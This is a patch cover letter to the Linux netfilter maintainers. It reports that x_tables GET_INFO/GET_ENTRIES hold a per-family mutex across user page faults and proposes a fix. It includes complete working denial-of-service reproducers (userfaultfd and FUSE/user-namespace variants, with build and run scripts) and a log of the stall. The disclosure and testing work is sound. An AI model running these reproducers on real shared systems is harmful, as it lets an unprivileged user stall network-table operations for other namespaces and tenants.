Received: from mail-oi2-f12.google.com (mail-oi2-f12.google.com [74.125.231.204])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6992C576EB0
	for <netfilter-devel@vger.kernel.org>; Wed,  9 Sep 2026 14:45:09 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.231.204
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788965111; cv=none; b=lAVivqUZsfZt+/FN9xMzOuAo3cRUmdWZlyzUu76g0wCkE6LtlXmXTizxZLgPXIYS8DEe1BMhBl176mV2JtCRwvpKJmX+OnpajjG/96idnz8bNfHa/q//vN0ve5IUfKgEj6w0S5W/vgkN7RRQ95y7g/cVcekyBH/Lhoe+InU7Eo0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788965111; c=relaxed/simple;
	bh=B8g433fZb3RxNdiIGulZWO0+fCZRkbkU6Llu9g6U5FQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=D7I2Q68jV2gNh5s1Ui3erddd//JO+WaD7SDsQhO2uF0pYyqCpLMWsucBjhK1Mz3G4dUn85ZxbNIKxw3qISNALBw+BU54gSjUt/spDHbQjsBprXzuRV+70x/ymYyziXgmB9r7E0+ACUeXP2V6dRiukQ2Ajna45Uwh+unAQtrlk7E=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=JPp4erBa; arc=none smtp.client-ip=74.125.231.204
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="JPp4erBa"
Received: by mail-oi2-f12.google.com with SMTP id 5614622812f47-4b37a30eb3bso1007917b6e.1
        for <netfilter-devel@vger.kernel.org>; Wed, 09 Sep 2026 07:45:09 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788965108; x=1789569908; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=dLWMKEnw9SQi3WVl5Uj3H91VhiJZnwVyXH/e0AVHsTQ=;
        b=JPp4erBaL4I5FlUoM4+xrszuvNgL+afNN3UV28lyn861Fe897RLB6IRB+MHp6YcfTg
         BotccfQQggW/ob/tkPZ3RU1lBGXEnCPoLBaIbZCZQFP+vzXw4VtNGNZiGHZ/uX0ziu/Q
         1Eh5mJmAQpDN+y5b/XxRfIHTfDqohs1LC8noVMWXvHCQL54IFBuPo7+FjC/w0OaVcEkR
         FH1xafCA+bUxCtpU/Bp20QV1fHt/Nz/vgtJUn5ebP94O/TN6SyBadqLRbqChZQm2tOgx
         ol4xEILaOXqlTy4rqGhalBhj6FyIKb/WpVecyPfKUbqUy8nWWHnU64MOmrobSdgF1anl
         a66w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788965108; x=1789569908;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=dLWMKEnw9SQi3WVl5Uj3H91VhiJZnwVyXH/e0AVHsTQ=;
        b=NRjjmKZIzZU2q88Q/8uYfxmyEKTCwnPXbU2uZ/T2ScXk3BvZbWeVcW65jU3lfutPYU
         jHIyA5EJozp72+ueSbQTHEn6FWn8XNFZ+O4suGhIKobnakXTt1s4dJLCOmCDC7E1XoYb
         rAHqWfsmb9gdPcB/zcIaxKja2vb/bWo4puc2thjeWdKh9Y6iVf6HP6oPZoCDu8vgKyi9
         eb/R4sRBpNA6b4sJ2QAxJxk0J597Bx4gjWacjhu368W/zI36F5ng7DJa92/xapub2ZxG
         rl0ZxU7/bahdTPhH3cgt6QU37NJ+aHOc390yeeeUBNvSf5ctGh4jViKtU37trxffuam4
         dAFw==
X-Forwarded-Encrypted: i=1; AKwUvByYnL3fWag2R8Ku5W1KAkVXnhqkjL3eUsinCAZKhdHpBK+S/b/uJkiR0Ks6lzBeU3fkplcDJf2MFFrcyF/2FRo=@vger.kernel.org
X-Gm-Message-State: AFuF++kNTxhdS1pUtoDi5LJISwqWI7hPTol3t6hxPaqKaGi0Yvg4SGVy
	+iJlio+Jetriy7vV3f23n+E9D1IDVc0d+mTLGc7MquKZe60y3ws5LrhRrsDxYCCJ0U7FZORycJw
	6nXU7mhkrywk=
X-Gm-Gg: AYBFou0AxjsA8H8udNoLWl4FbS/dn3WdSG83lo/G6wjMccdAu6Tg6zWh+CDCFRuQsp4
	voBqymg9FRH11CRc+lmdOsa0g8nW8r97rRxK3lroIOlbYYcq1IvwtWRpg+4C3K7BBfhjp+hKV9D
	cvLp8hMAfxVpkqGrt7qrf8mY/5lcdCyV9GuDapWohYfxecw9t58SrRYr2fbgml0W9lQXTJSsba/
	4mp7l3J//kVJdRHHvclSMWPlv+nzWK/UqXSVRVQZxyjbeSE8NscsGM4kcdd1qlc2YDjnMokFVJH
	11dujQ5IQcju/rbvvHo8B2KWPP1BLpUqMLGJ6wQNCCyxQgjfDZwRYBLux6LrrE1EeHLvfOeEBLW
	7NxC+5JWU1UBpbXlmAtfkrCppy2hkckGPV2fSHXQPdjZ/dxQRJkIXbXSo2OI2fuexWBJ8OvJAQO
	i3AfKuwoCjwl8gustW/Xz+5gV2jIrH6XXddXi+QdtrB5G695wkW2rLJGB0UvCD7zqFSgizdzXBH
	52age3z6lPZZJ54m79m+asFtXF+XMfcCQCXzMOS
X-Received: by 2002:a05:6a20:748a:b0:3a0:bc61:62e6 with SMTP id adf61e73a8af0-3dabb068e4fmr8886019637.8.1788964628801;
        Wed, 09 Sep 2026 07:37:08 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc455451b46sm6784762a12.18.2026.09.09.07.37.02
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 09 Sep 2026 07:37:07 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Pablo Neira Ayuso <pablo@netfilter.org>,
	Florian Westphal <fw@strlen.de>
Cc: Zihan Xi <zihanx@nebusec.ai>,
	Phil Sutter <phil@nwl.cc>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	netfilter-devel@vger.kernel.org,
	coreteam@netfilter.org,
	netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH nf v2 0/1] netfilter: x_tables: avoid holding mutex over faultable user copies
Date: Wed,  9 Sep 2026 14:36:57 +0000
Message-ID: <cover.1788961415.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/netfilter/arp_tables.c. The
same lock-scope bug is also in net/ipv4/netfilter/ip_tables.c and
net/ipv6/netfilter/ip6_tables.c. A non-root user with CAP_NET_ADMIN in a
private user and network namespace can trigger it with a FUSE-backed
output buffer. We've tested it, and it should not affect any other
functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

GET_INFO and GET_ENTRIES hold a per-family xtables mutex across
faultable userspace copies. The mutex belongs to the protocol family,
not to a network namespace, so unrelated table operations block,
including callers in other network namespaces. The capability check is
ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN).

The tested non-root path uses a FUSE-backed GET_ENTRIES buffer. poc.c
is a root-only userfaultfd variant on the guest because
vm.unprivileged_userfaultfd=0. We reproduced this on ARP; IPv4 and
IPv6 have the same lock scope and are changed here, but were not
separately run.

This lock scope is already present in 1da177e4c3f4 ("Linux-2.6.12-rc2"),
the Git root commit. Later namespace support only made it reachable by a
non-root user. The trailer records that commit as the earliest Git
snapshot, not as a proven first introduction.

The patch disables page faults during the locked copy, unlocks, faults
in the output range, and retries once. GET_INFO copies its fixed-size
result after unlocking. A second inatomic failure returns -EFAULT
without taking the mutex into a user page fault.

GET_ENTRIES can still sleep under the lock in alloc_counters()/vzalloc()
and cond_resched(); those are kernel-side waits, not the user-controlled
fault. ebtables GET still copies under ebt_mutex and is unchanged.

Reproducer:

The following files must be saved with these exact names in one directory.
The commands below build all helpers and run the FUSE/user-namespace path.
The FUSE helper binary is named poc-userns-trig.

    mkdir -p /tmp/xtables-poc
    cd /tmp/xtables-poc
    apt-get update
    apt-get install -y fuse3 libfuse3-dev pkg-config gcc make
    make
    ./poc.sh

The holder sleeps in folio_wait_bit_common on the FUSE-backed output
page. A GET_INFO waiter in another network namespace blocks in
xt_find_table_lock. After the patch, GET_INFO returns immediately while
the holder remains stalled.

The root-only userfaultfd path:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

    qemu-system-x86_64 -machine accel=kvm -cpu host -smp 2 -m 2G

The observation log used:

    root=/dev/sda rw console=ttyS0 net.ifnames=0 panic=-1

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netfilter_arp/arp_tables.h>
#include <linux/userfaultfd.h>
#include <netinet/in.h>
#include <poll.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef ARRAY_SIZE
#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#endif

static const char *table_name = "filter";

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static int make_ipv4_sock(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket(AF_INET, SOCK_DGRAM)");
	return fd;
}

static unsigned int fetch_table_size(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int fd = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
		die("getsockopt(ARPT_SO_GET_INFO)");
	if (len != sizeof(info)) {
		fprintf(stderr, "unexpected ARPT_SO_GET_INFO length %u\n",
			(unsigned int)len);
		exit(EXIT_FAILURE);
	}

	close(fd);
	return info.size;
}

static int setup_userfaultfd(void *addr, size_t len)
{
	struct uffdio_api api;
	struct uffdio_register reg;
	int uffd;

	uffd = syscall(SYS_userfaultfd, 0);
	if (uffd < 0)
		die("userfaultfd");

	memset(&api, 0, sizeof(api));
	api.api = UFFD_API;
	if (ioctl(uffd, UFFDIO_API, &api) < 0)
		die("UFFDIO_API");

	memset(&reg, 0, sizeof(reg));
	reg.range.start = (unsigned long)addr;
	reg.range.len = len;
	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0)
		die("UFFDIO_REGISTER");

	return uffd;
}

static void hang_in_get_entries(unsigned int table_size)
{
	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
	size_t data_len = (table_size + page_size - 1) & ~(page_size - 1);
	size_t map_len = page_size + data_len;
	char *mapping;
	struct arpt_get_entries *get;
	socklen_t len;
	int fd;
	int uffd;

	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mapping == MAP_FAILED)
		die("mmap");

	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
	memset(get, 0, sizeof(*get));
	strncpy(get->name, table_name, sizeof(get->name) - 1);
	get->size = table_size;

	uffd = setup_userfaultfd(mapping + page_size, data_len);
	(void)uffd;

	fd = make_ipv4_sock();
	len = sizeof(*get) + table_size;

	fprintf(stderr,
		"holder[%d]: calling ARPT_SO_GET_ENTRIES with %u-byte table and a missing output page\n",
		getpid(), table_size);
	fflush(stderr);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
		fprintf(stderr,
			"holder[%d]: GET_ENTRIES unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static void block_on_xt_mutex(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int fd = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	fprintf(stderr,
		"waiter[%d]: calling ARPT_SO_GET_INFO and should block on xt[NFPROTO_ARP].mutex\n",
		getpid());
	fflush(stderr);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static pid_t spawn_child(void (*fn)(unsigned int), unsigned int arg)
{
	pid_t pid = fork();

	if (pid < 0)
		die("fork");
	if (pid == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		fn(arg);
		_exit(EXIT_FAILURE);
	}
	return pid;
}

static pid_t spawn_waiter_child(void)
{
	pid_t pid = fork();

	if (pid < 0)
		die("fork");
	if (pid == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		block_on_xt_mutex();
		_exit(EXIT_FAILURE);
	}
	return pid;
}

static void dump_proc_state(pid_t pid, const char *tag)
{
	char path[64];
	char buf[256];
	int fd;
	ssize_t n;

	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return;
	buf[n] = '\0';
	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
}

int main(void)
{
	unsigned int table_size;
	pid_t holder;
	pid_t waiter;
	unsigned int i;

	if (geteuid() != 0) {
		fprintf(stderr, "run as root for the userfaultfd-based trigger path\n");
		return EXIT_FAILURE;
	}

	table_size = fetch_table_size();
	fprintf(stderr, "parent[%d]: table \"%s\" size=%u bytes\n",
		getpid(), table_name, table_size);

	holder = spawn_child(hang_in_get_entries, table_size);
	sleep(1);
	waiter = spawn_waiter_child();

	fprintf(stderr,
		"parent[%d]: holder=%d waiter=%d; dumping wchan while waiter should block\n",
		getpid(), holder, waiter);
	fflush(stderr);

	for (i = 0; i < 30; i++) {
		dump_proc_state(holder, "holder");
		dump_proc_state(waiter, "waiter");
		sleep(1);
	}

	fprintf(stderr, "parent[%d]: holder/waiter still stalled; mutex hold is the bug\n", getpid());
	kill(holder, SIGKILL);
	kill(waiter, SIGKILL);
	waitpid(holder, NULL, 0);
	waitpid(waiter, NULL, 0);
	return EXIT_FAILURE;
}
------END poc.c------

------BEGIN poc_userns_trigger.c------
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/netfilter_arp/arp_tables.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef SOL_IP
#define SOL_IP 0
#endif

static const char *table_name = "filter";

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static int make_ipv4_sock(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket(AF_INET, SOCK_DGRAM)");
	return fd;
}

static unsigned int fetch_table_size(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int fd = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
		die("getsockopt(ARPT_SO_GET_INFO)");

	close(fd);
	return info.size;
}

static void hang_in_get_entries(unsigned int table_size, const char *path)
{
	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
	size_t map_len = page_size * 2;
	char *mapping;
	struct arpt_get_entries *get;
	int backing_fd;
	int sock;
	socklen_t len;

	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mapping == MAP_FAILED)
		die("mmap anonymous");

	backing_fd = open(path, O_RDWR | O_CLOEXEC);
	if (backing_fd < 0)
		die("open fuse file");

	if (mmap(mapping + page_size, page_size, PROT_READ | PROT_WRITE,
		 MAP_PRIVATE | MAP_FIXED, backing_fd, 0) == MAP_FAILED)
		die("mmap fuse page");
	close(backing_fd);

	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
	memset(get, 0, sizeof(*get));
	strncpy(get->name, table_name, sizeof(get->name) - 1);
	get->size = table_size;

	sock = make_ipv4_sock();
	len = sizeof(*get) + table_size;

	fprintf(stderr,
		"holder[%d]: namespace GET_ENTRIES using FUSE-backed output page\n",
		getpid());
	fflush(stderr);

	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
		fprintf(stderr, "holder[%d]: GET_ENTRIES unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static void block_on_xt_mutex(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int sock = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	fprintf(stderr,
		"waiter[%d]: namespace GET_INFO expected to block on xt mutex\n",
		getpid());
	fflush(stderr);

	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static void dump_netns(pid_t pid, const char *tag)
{
	char path[64];
	char link[128];
	ssize_t n;

	snprintf(path, sizeof(path), "/proc/%d/ns/net", pid);
	n = readlink(path, link, sizeof(link) - 1);
	if (n <= 0)
		return;
	link[n] = '\0';
	fprintf(stderr, "%s[%d]: netns=%s\n", tag, pid, link);
}

static void dump_wchan(pid_t pid, const char *tag)
{
	char path[64];
	char buf[256];
	int fd;
	ssize_t n;

	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return;
	buf[n] = '\0';
	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
}

int main(int argc, char **argv)
{
	unsigned int table_size;
	pid_t holder;
	pid_t waiter;
	unsigned int i;

	if (argc != 2) {
		fprintf(stderr, "usage: %s <fuse-file-path>\n", argv[0]);
		return EXIT_FAILURE;
	}

	if (geteuid() != 0) {
		fprintf(stderr,
			"run under unshare -Urn so the process has namespace-local CAP_NET_ADMIN\n");
		return EXIT_FAILURE;
	}

	table_size = fetch_table_size();
	dump_netns(getpid(), "parent");
	fprintf(stderr, "parent[%d]: namespace table size=%u bytes\n",
		getpid(), table_size);

	holder = fork();
	if (holder < 0)
		die("fork");
	if (holder == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		if (unshare(CLONE_NEWNET) < 0)
			die("unshare(CLONE_NEWNET)");
		table_size = fetch_table_size();
		fprintf(stderr,
			"holder[%d]: entered a separate network namespace\n",
			getpid());
		hang_in_get_entries(table_size, argv[1]);
	}

	sleep(1);

	waiter = fork();
	if (waiter < 0)
		die("fork");
	if (waiter == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		dump_netns(getpid(), "waiter");
		block_on_xt_mutex();
	}

	fprintf(stderr,
		"parent[%d]: holder=%d waiter=%d; dumping wchan while waiter should block\n",
		getpid(), holder, waiter);
	fflush(stderr);

	for (i = 0; i < 30; i++) {
		dump_netns(holder, "holder");
		dump_netns(waiter, "waiter");
		dump_wchan(holder, "holder");
		dump_wchan(waiter, "waiter");
		sleep(1);
	}

	kill(holder, SIGKILL);
	kill(waiter, SIGKILL);
	waitpid(holder, NULL, 0);
	waitpid(waiter, NULL, 0);
	return EXIT_FAILURE;
}
------END poc_userns_trigger.c------

------BEGIN fuse_stall.c------
#define FUSE_USE_VERSION 31

#include <errno.h>
#include <fuse3/fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static const char *file_name = "stall.bin";
static const size_t file_size = 4096;

static int stall_getattr(const char *path, struct stat *st,
			 struct fuse_file_info *fi)
{
	(void)fi;
	memset(st, 0, sizeof(*st));

	if (strcmp(path, "/") == 0) {
		st->st_mode = S_IFDIR | 0755;
		st->st_nlink = 2;
		return 0;
	}

	if (strcmp(path, "/stall.bin") == 0) {
		st->st_mode = S_IFREG | 0666;
		st->st_nlink = 1;
		st->st_size = file_size;
		return 0;
	}

	return -ENOENT;
}

static int stall_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
			 off_t off, struct fuse_file_info *fi,
			 enum fuse_readdir_flags flags)
{
	(void)off;
	(void)fi;
	(void)flags;

	if (strcmp(path, "/") != 0)
		return -ENOENT;

	filler(buf, ".", NULL, 0, 0);
	filler(buf, "..", NULL, 0, 0);
	filler(buf, file_name, NULL, 0, 0);
	return 0;
}

static int stall_open(const char *path, struct fuse_file_info *fi)
{
	(void)fi;

	if (strcmp(path, "/stall.bin") != 0)
		return -ENOENT;
	return 0;
}

static int stall_read(const char *path, char *buf, size_t size, off_t off,
		      struct fuse_file_info *fi)
{
	(void)buf;
	(void)size;
	(void)off;
	(void)fi;

	if (strcmp(path, "/stall.bin") != 0)
		return -ENOENT;

	fprintf(stderr,
		"fuse[%d]: read request for stall.bin received; stalling indefinitely\n",
		getpid());
	fflush(stderr);

	for (;;)
		pause();
}

static const struct fuse_operations stall_ops = {
	.getattr = stall_getattr,
	.readdir = stall_readdir,
	.open = stall_open,
	.read = stall_read,
};

int main(int argc, char **argv)
{
	if (argc != 2) {
		fprintf(stderr, "usage: %s <mountpoint>\n", argv[0]);
		return EXIT_FAILURE;
	}

	return fuse_main(argc, argv, &stall_ops, NULL);
}
------END fuse_stall.c------

------BEGIN Makefile------
CC ?= gcc
CFLAGS ?= -O2 -Wall -Wextra
PKG_CONFIG ?= pkg-config

FUSE_AVAILABLE := $(shell $(PKG_CONFIG) --exists fuse3 && echo 1 || echo 0)
FUSE_CFLAGS := $(shell $(PKG_CONFIG) --cflags fuse3 2>/dev/null)
FUSE_LIBS := $(shell $(PKG_CONFIG) --libs fuse3 2>/dev/null)

ifeq ($(FUSE_AVAILABLE),1)
ALL_TARGETS := poc poc-userns-trig fuse_stall
else
ALL_TARGETS := poc poc-userns-trig
endif

.PHONY: all clean

all: $(ALL_TARGETS)

poc: poc.c
	$(CC) $(CFLAGS) -o $@ $<

poc-userns-trig: poc_userns_trigger.c
	$(CC) $(CFLAGS) -o $@ $<

fuse_stall: fuse_stall.c
ifeq ($(FUSE_AVAILABLE),1)
	$(CC) $(CFLAGS) $(FUSE_CFLAGS) -o $@ $< $(FUSE_LIBS)
else
	@echo "fuse3 headers not found; install libfuse3-dev in the guest to build fuse_stall" >&2
	@exit 1
endif

clean:
	rm -f poc poc-userns-trig fuse_stall
------END Makefile------

------BEGIN poc.sh------
#!/bin/sh
set -eu

mnt="${1:-$HOME/fusemnt}"
fuse_bin="${FUSE_BIN:-./fuse_stall}"
trigger_bin="${TRIGGER_BIN:-./poc-userns-trig}"
log_file="${FUSE_LOG:-$HOME/fuse_stall.log}"

fusermount3 -u -q "$mnt" 2>/dev/null || true
rm -rf "$mnt"
mkdir -p "$mnt"

"$fuse_bin" "$mnt" >"$log_file" 2>&1 &
for _ in $(seq 1 50); do
	if [ -e "$mnt/stall.bin" ]; then
		exec unshare -Urn "$trigger_bin" "$mnt/stall.bin"
	fi
	sleep 0.2
done

echo "timed out waiting for $mnt/stall.bin" >&2
exit 1
------END poc.sh------

Unpatched FUSE/user-namespace observation. The holder is in a FUSE page
fault; the waiter is blocked on the xt mutex.

----BEGIN crash log----
parent[540]: netns=net:[4026532177]
parent[540]: namespace table size=952 bytes
holder[550]: entered a separate network namespace
holder[550]: namespace GET_ENTRIES using FUSE-backed output page
parent[540]: holder=550 waiter=551; dumping wchan while waiter should block
holder[550]: netns=net:[4026532247]
waiter[551]: netns=net:[4026532177]
holder[550]: wchan=folio_wait_bit_common
waiter[551]: netns=net:[4026532177]
waiter[551]: wchan=0
waiter[551]: namespace GET_INFO expected to block on xt mutex
holder[550]: netns=net:[4026532247]
waiter[551]: netns=net:[4026532177]
holder[550]: wchan=folio_wait_bit_common
waiter[551]: wchan=xt_find_table_lock
holder[550]: netns=net:[4026532247]
waiter[551]: netns=net:[4026532177]
holder[550]: wchan=folio_wait_bit_common
waiter[551]: wchan=xt_find_table_lock
holder[550]: netns=net:[4026532247]
waiter[551]: netns=net:[4026532177]
holder[550]: wchan=folio_wait_bit_common
waiter[551]: wchan=xt_find_table_lock
-----END crash log-----

Best regards,
Zihan Xi

---
changes in v2:
  - Rebase onto current nf.git after 0bd7ed1a3263c ("netfilter:
    arp_tables: remove the 32bit compat interface"). ARP GET_INFO
    and GET_ENTRIES are updated on the native paths only. IPv4 and
    IPv6 still include the compat GET_ENTRIES retry.
  - Drop hung_task_panic and the 10-second hung_task timeout from the
    reproducer, as pointed out by Pablo Neira Ayuso. Observe the stall
    through holder/waiter wchan instead.
  - v1 Link: https://lore.kernel.org/all/cover.1788244146.git.zihanx@nebusec.ai/

Zihan Xi (1):
  netfilter: x_tables: avoid holding mutex over faultable user copies

 net/ipv4/netfilter/arp_tables.c | 22 +++++++++++++++++-----
 net/ipv4/netfilter/ip_tables.c  | 33 ++++++++++++++++++++++++++++-----
 net/ipv6/netfilter/ip6_tables.c | 33 ++++++++++++++++++++++++++++-----
 3 files changed, 73 insertions(+), 15 deletions(-)

-- 
2.43.0
